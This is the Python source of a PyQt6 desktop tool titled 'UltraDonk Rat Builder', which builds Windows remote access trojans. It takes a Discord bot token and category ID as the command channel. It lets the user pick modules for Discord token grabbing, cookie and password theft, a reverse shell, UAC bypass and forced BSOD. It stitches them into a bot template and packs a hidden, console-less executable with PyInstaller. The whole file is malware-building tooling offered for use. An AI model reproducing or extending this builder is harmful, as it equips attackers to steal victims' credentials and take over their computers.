import sys
import os
import shutil
import subprocess
from PyQt6.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
                             QWidget, QCheckBox, QLineEdit, QLabel, QPushButton, 
                             QGroupBox, QMessageBox, QFrame, QTextEdit)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QFont, QPalette, QColor

class RatBuilderGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        
    def initUI(self):
        self.setWindowTitle('UltraDonk Builder')
        self.setFixedSize(600, 800)
        
        # Set window to always stay on top
        self.setWindowFlags(self.windowFlags() | Qt.WindowType.WindowStaysOnTopHint)
        
        # Set dark theme matching your CSS
        self.set_dark_theme()
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(10)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Title
        title = QLabel('UltraDonk Rat Builder')
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setFont(QFont('Playfair Display', 18, QFont.Weight.Bold))
        title.setStyleSheet('color: #D4A017; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px;')
        layout.addWidget(title)
        
        # Output filename group
        filename_group = QGroupBox('Output Configuration')
        filename_group.setStyleSheet(self.groupbox_style())
        filename_layout = QVBoxLayout(filename_group)
        
        filename_input_layout = QHBoxLayout()
        filename_label = QLabel('Output Filename:')
        filename_label.setStyleSheet('color: #f5f5f5; font-size: 1.1em;')
        filename_label.setFixedWidth(120)
        filename_input_layout.addWidget(filename_label)
        self.filename_input = QLineEdit()
        self.filename_input.setPlaceholderText('Enter output filename (without .exe)')
        self.filename_input.setText('built_bot')
        self.filename_input.setStyleSheet(self.input_style())
        filename_input_layout.addWidget(self.filename_input)
        filename_layout.addLayout(filename_input_layout)
        
        layout.addWidget(filename_group)
        
        # Configuration group
        config_group = QGroupBox('Bot Configuration')
        config_group.setStyleSheet(self.groupbox_style())
        config_layout = QVBoxLayout(config_group)
        
        # Bot Token
        token_layout = QHBoxLayout()
        token_label = QLabel('Bot Token:')
        token_label.setStyleSheet('color: #f5f5f5; font-size: 1.1em;')
        token_label.setFixedWidth(120)
        token_layout.addWidget(token_label)
        self.token_input = QLineEdit()
        self.token_input.setPlaceholderText('Enter bot token here...')
        self.token_input.setStyleSheet(self.input_style())
        token_layout.addWidget(self.token_input)
        config_layout.addLayout(token_layout)
        
        # Category ID
        category_layout = QHBoxLayout()
        category_label = QLabel('Category ID:')
        category_label.setStyleSheet('color: #f5f5f5; font-size: 1.1em;')
        category_label.setFixedWidth(120)
        category_layout.addWidget(category_label)
        self.category_input = QLineEdit()
        self.category_input.setPlaceholderText('Enter category ID here...')
        self.category_input.setStyleSheet(self.input_style())
        category_layout.addWidget(self.category_input)
        config_layout.addLayout(category_layout)
        
        layout.addWidget(config_group)
        
        # Commands group
        commands_group = QGroupBox('Select Commands')
        commands_group.setStyleSheet(self.groupbox_style())
        commands_layout = QVBoxLayout(commands_group)
        
        # Command checkboxes (jumpscare removed)
        self.commands = {
            'tkn_grab': QCheckBox('Token Grabber'),
            'bsod': QCheckBox('BSOD'),
            'get_cookies': QCheckBox('Get Cookies'),
            'pass_light': QCheckBox('Password Grabber Light'),
            'pass_heavy': QCheckBox('Password Grabber Heavy'),
            'reverse_shell': QCheckBox('Reverse Shell'),
            'uac': QCheckBox('UAC Bypass')
        }
        
        # Style checkboxes to match your theme
        for command in self.commands.values():
            command.setStyleSheet('color: #f5f5f5; font-family: "Playfair Display"; font-size: 1.1em;')
            commands_layout.addWidget(command)
        
        layout.addWidget(commands_group)
        
        # Select All buttons
        select_buttons_layout = QHBoxLayout()
        self.select_all_btn = QPushButton('Select All')
        self.deselect_all_btn = QPushButton('Deselect All')
        self.select_all_btn.setStyleSheet(self.button_style())
        self.deselect_all_btn.setStyleSheet(self.button_style())
        self.select_all_btn.clicked.connect(self.select_all_commands)
        self.deselect_all_btn.clicked.connect(self.deselect_all_commands)
        select_buttons_layout.addWidget(self.select_all_btn)
        select_buttons_layout.addWidget(self.deselect_all_btn)
        layout.addLayout(select_buttons_layout)
        
        # Build button
        self.build_btn = QPushButton('Build Bot')
        self.build_btn.setFont(QFont('Playfair Display', 12, QFont.Weight.Bold))
        self.build_btn.setStyleSheet(self.build_button_style())
        self.build_btn.clicked.connect(self.build_bot)
        layout.addWidget(self.build_btn)
        
        # Status and output
        output_group = QGroupBox('Build Output')
        output_group.setStyleSheet(self.groupbox_style())
        output_layout = QVBoxLayout(output_group)
        
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMaximumHeight(150)
        self.output_text.setStyleSheet('''
            background-color: #2c2c2c; 
            color: #D4A017; 
            font-family: "Roboto", sans-serif;
            border: 1px solid #D4A017;
            border-radius: 8px;
            padding: 8px;
        ''')
        output_layout.addWidget(self.output_text)
        
        layout.addWidget(output_group)
        
    def set_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a1a;
                color: #f5f5f5;
                font-family: 'Playfair Display', serif;
            }
        """)
    
    def groupbox_style(self):
        return """
            QGroupBox {
                color: #f5f5f5;
                font-weight: bold;
                font-family: 'Playfair Display', serif;
                border: 2px solid #D4A017;
                border-radius: 12px;
                margin-top: 1ex;
                padding-top: 10px;
                background: linear-gradient(145deg, #2c2c2c, #1a1a1a);
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #D4A017;
                font-size: 1.2em;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
        """
    
    def input_style(self):
        return """
            QLineEdit {
                background-color: #333333;
                color: #f5f5f5;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-size: 1em;
                font-family: 'Roboto', sans-serif;
            }
            QLineEdit:focus {
                outline: none;
                border: 2px solid #D4A017;
                background-color: #3c3c3c;
            }
            QLineEdit::placeholder {
                color: #888888;
            }
        """
    
    def button_style(self):
        return """
            QPushButton {
                background-color: #333333;
                color: #f5f5f5;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Playfair Display', serif;
                font-size: 1.1em;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            QPushButton:hover {
                background-color: #3c3c3c;
                transform: translateY(-2px);
            }
            QPushButton:pressed {
                background-color: #2c2c2c;
            }
        """
    
    def build_button_style(self):
        return """
            QPushButton {
                background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 0, 
                    stop: 0 #D4A017, stop: 1 #FFD700);
                color: #1a1a1a;
                border: none;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Playfair Display', serif;
                font-weight: bold;
                font-size: 1.1em;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            QPushButton:hover {
                transform: translateY(-2px);
            }
            QPushButton:pressed {
                background: qlineargradient(x1: 0, y1: 0, x2: 1, y2: 0, 
                    stop: 0 #B8860B, stop: 1 #DAA520);
            }
        """
            
    def select_all_commands(self):
        for checkbox in self.commands.values():
            checkbox.setChecked(True)
            
    def deselect_all_commands(self):
        for checkbox in self.commands.values():
            checkbox.setChecked(False)
            
    def build_bot(self):
        token = self.token_input.text().strip()
        category_id = self.category_input.text().strip()
        output_filename = self.filename_input.text().strip()
        
        if not output_filename:
            QMessageBox.warning(self, 'Error', 'Please enter an output filename!')
            return
            
        if not token:
            QMessageBox.warning(self, 'Error', 'Please enter a bot token!')
            return
            
        if not category_id:
            QMessageBox.warning(self, 'Error', 'Please enter a category ID!')
            return
            
        selected_commands = [name for name, checkbox in self.commands.items() if checkbox.isChecked()]
        if not selected_commands:
            QMessageBox.warning(self, 'Error', 'Please select at least one command!')
            return
            
        try:
            self.output_text.clear()
            self.output_text.append("Starting build process...")
            
            # Create build directory if it doesn't exist
            build_dir = "build"
            if not os.path.exists(build_dir):
                os.makedirs(build_dir)
                self.output_text.append(f"Created build directory: {build_dir}")
            
            # Generate the bot file in build directory
            python_file = self.generate_bot_file(token, category_id, selected_commands, output_filename, build_dir)
            
            # Build EXE with PyInstaller
            exe_file = self.build_with_pyinstaller(python_file, output_filename, build_dir)
            
            self.output_text.append("Build completed successfully!")
            self.output_text.append(f"Final output: {os.path.basename(exe_file)}")
            self.output_text.append(f"Location: {os.path.abspath(build_dir)}")
            
            # Open the build folder
            self.open_build_folder(build_dir)
            
            QMessageBox.information(self, 'Success', 
                f'Bot built successfully!\n\n'
                f'Final output: {os.path.basename(exe_file)}\n'
                f'Location: {os.path.abspath(build_dir)}\n\n'
                f'The build folder has been opened.')
            
        except Exception as e:
            self.output_text.append(f"Error: {str(e)}")
            QMessageBox.critical(self, 'Error', f'Failed to build bot: {str(e)}')
    
    def generate_bot_file(self, token, category_id, selected_commands, output_filename, build_dir):
        self.output_text.append("Reading source template...")
        
        # Read the source template from rat_builder folder
        source_path = os.path.join('rat_builder', 'donkratsource.py')
        if not os.path.exists(source_path):
            raise FileNotFoundError(f"Source template not found: {source_path}")
        
        with open(source_path, 'r', encoding='utf-8') as f:
            template_content = f.read()
        
        self.output_text.append("Generating command implementations...")
        
        # Generate command definitions
        command_definitions = []
        
        for command_name in selected_commands:
            # Map command names to actual filenames (jumpscare removed)
            command_file_map = {
                'tkn_grab': 'discord_token_grabber.py',
                'bsod': 'bsod.py',
                'get_cookies': 'get_cookies.py',
                'pass_light': 'passwords_grabber.py',
                'pass_heavy': 'gruppe.py',
                'reverse_shell': 'reverse_shell.py',
                'uac': 'uac_bypass.py'
            }
            
            command_file = command_file_map.get(command_name)
            if not command_file:
                continue
                
            command_path = os.path.join('rat_builder', command_file)
            
            if os.path.exists(command_path):
                with open(command_path, 'r', encoding='utf-8') as f:
                    command_code = f.read().strip()
                
                # Add command definition
                command_definitions.append(f"""

@bot.command()
async def {command_name}(ctx):
{self.indent_code(command_code)}
""")
                self.output_text.append(f"Added command: {command_name}")
            else:
                self.output_text.append(f"Warning: Command file not found: {command_path}")
        
        # Replace placeholders in template
        # Replace placeholders in template
        template_content = template_content.replace(
            'category_id="replaceme --> in builder category id"',
            f'category_id="{category_id}"'
        )

        template_content = template_content.replace(
            "bot.run('bot token here-->replace')",
            f"bot.run('{token}')"
        )
        
        # Remove placeholder command definitions (the ones at the bottom of the file)
        # These are the placeholder commands that need to be removed
        placeholder_commands = [
            '@bot.command()\nasync def tkn_grab(ctx):#done\n    filename="discord_token_grabber.py"',
            '@bot.command()\nasync def bsod(ctx):#done\n    filename="bsod.py"',
            '@bot.command()\nasync def get_cookies(ctx):#done\n    filename="get_cookies.py"',
            '@bot.command()\nasync def pass_light(ctx):#done\n    filename="passwords_grabber.py"',
            '@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done\n    filename="gruppe.py"',
            '@bot.command()\nasync def reverse_shell(ctx):#done\n    filename="reverse_shell"',
            '@bot.comnand()\nasync def uac(ctx):\n    filename="uac_bypass.py"'
        ]
        
        for placeholder in placeholder_commands:
            template_content = template_content.replace(placeholder, '')
        
        # Also remove individual lines if the multi-line approach doesn't catch them
        template_content = template_content.replace('@bot.command()\nasync def tkn_grab(ctx):#done', '')
        template_content = template_content.replace('    filename="discord_token_grabber.py"', '')
        template_content = template_content.replace('@bot.command()\nasync def bsod(ctx):#done', '')
        template_content = template_content.replace('    filename="bsod.py"', '')
        template_content = template_content.replace('@bot.command()\nasync def get_cookies(ctx):#done', '')
        template_content = template_content.replace('    filename="get_cookies.py"', '')
        template_content = template_content.replace('@bot.command()\nasync def pass_light(ctx):#done', '')
        template_content = template_content.replace('    filename="passwords_grabber.py"', '')
        template_content = template_content.replace('@bot.command()\nasync def pass_heavy(ctx,bot_k,cat_id):#done', '')
        template_content = template_content.replace('    filename="gruppe.py"', '')
        template_content = template_content.replace('@bot.command()\nasync def reverse_shell(ctx):#done', '')
        template_content = template_content.replace('    filename="reverse_shell"', '')
        template_content = template_content.replace('@bot.comnand()\nasync def uac(ctx):', '')
        template_content = template_content.replace('    filename="uac_bypass.py"', '')
        
        # Insert command definitions before the bot.run line
        commands_section = '\n'.join(command_definitions)
        
        # Find the position to insert commands (before bot.run)
        run_line = f"bot.run('{token}')"
        if run_line in template_content:
            template_content = template_content.replace(
                run_line, 
                commands_section + '\n\n' + run_line
            )
        else:
            # Fallback: append before last line
            lines = template_content.split('\n')
            lines.insert(-1, commands_section)
            template_content = '\n'.join(lines)
        
        # Write the final bot file to build directory
        python_filename = os.path.join(build_dir, f"{output_filename}.py")
        with open(python_filename, 'w', encoding='utf-8') as f:
            f.write(template_content)
        
        self.output_text.append(f"Generated Python file: {os.path.basename(python_filename)}")
        return python_filename
    def find_pyinstaller(self):
        """Find PyInstaller executable in system PATH or common locations"""
        # Try direct import first (if pyinstaller is installed as module)
        try:
            import PyInstaller
            return sys.executable  # Use current Python interpreter
        except ImportError:
            pass
        
        # Try common PyInstaller executable locations
        possible_paths = [
            "pyinstaller",
            "pyinstaller.exe",
            os.path.join(os.path.dirname(sys.executable), "Scripts", "pyinstaller.exe"),
            os.path.join(os.path.dirname(sys.executable), "Scripts", "pyinstaller"),
            os.path.join(os.path.dirname(sys.executable), "pyinstaller.exe"),
            os.path.join(os.path.dirname(sys.executable), "pyinstaller"),
        ]
        
        for path in possible_paths:
            try:
                if shutil.which(path):
                    return path
            except:
                continue
        
        raise FileNotFoundError("PyInstaller not found. Please install it with: pip install pyinstaller")
    
    def build_with_pyinstaller(self, python_file, output_name, build_dir):
        self.output_text.append("Building EXE with PyInstaller...")
        
        # Find PyInstaller
        pyinstaller_cmd = self.find_pyinstaller()
        
        # Create temp directory for PyInstaller
        temp_dir = os.path.join(build_dir, 'pyinstaller_temp')
        os.makedirs(temp_dir, exist_ok=True)
        
        # PyInstaller command
        if pyinstaller_cmd == sys.executable:
            # Use Python module approach
            cmd = [
                sys.executable,
                '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                '--name', output_name,
                '--distpath', build_dir,
                '--workpath', temp_dir,
                '--specpath', build_dir,
                python_file
            ]
        else:
            # Use pyinstaller executable
            cmd = [
                pyinstaller_cmd,
                '--onefile',
                '--noconsole',
                '--name', output_name,
                '--distpath', build_dir,
                '--workpath', temp_dir,
                '--specpath', build_dir,
                python_file
            ]
        
        self.output_text.append(f"Running: {' '.join(cmd)}")
        
        # Run PyInstaller
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
        
        if result.returncode != 0:
            self.output_text.append(f"PyInstaller stdout: {result.stdout}")
            self.output_text.append(f"PyInstaller stderr: {result.stderr}")
            raise Exception(f"PyInstaller failed with return code {result.returncode}")
        
        self.output_text.append("PyInstaller build completed successfully")
        
        # Get the path to the generated EXE
        exe_file = os.path.join(build_dir, f"{output_name}.exe")
        
        if not os.path.exists(exe_file):
            # Try alternative location (sometimes PyInstaller puts it in dist subfolder)
            alt_exe_file = os.path.join(build_dir, 'dist', f"{output_name}.exe")
            if os.path.exists(alt_exe_file):
                shutil.move(alt_exe_file, exe_file)
                dist_dir = os.path.join(build_dir, 'dist')
                if os.path.exists(dist_dir):
                    shutil.rmtree(dist_dir)
            else:
                raise FileNotFoundError(f"PyInstaller did not create expected file: {exe_file}")
        
        # Clean up PyInstaller temporary files
        spec_file = os.path.join(build_dir, f"{output_name}.spec")
        
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        if os.path.exists(spec_file):
            os.remove(spec_file)
            
        self.output_text.append(f"EXE created: {os.path.basename(exe_file)}")
        
        # Show file size
        file_size = os.path.getsize(exe_file) / 1024 / 1024
        self.output_text.append(f"EXE size: {file_size:.2f} MB")
        
        return exe_file
    
    def indent_code(self, code):
        """Indent code for proper Python formatting"""
        lines = code.split('\n')
        indented_lines = ['    ' + line for line in lines]
        return '\n'.join(indented_lines)
    
    def open_build_folder(self, build_dir):
        """Open the build folder in file explorer"""
        try:
            if os.name == 'nt':  # Windows
                os.startfile(os.path.abspath(build_dir))
            elif os.name == 'posix':  # macOS or Linux
                if sys.platform == 'darwin':  # macOS
                    subprocess.run(['open', build_dir])
                else:  # Linux
                    subprocess.run(['xdg-open', build_dir])
            self.output_text.append(f"Opened build folder: {os.path.abspath(build_dir)}")
        except Exception as e:
            self.output_text.append(f"Note: Could not open folder automatically: {str(e)}")
            self.output_text.append(f"Build files saved to: {os.path.abspath(build_dir)}")

def main():
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    window = RatBuilderGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == '__main__':
    main()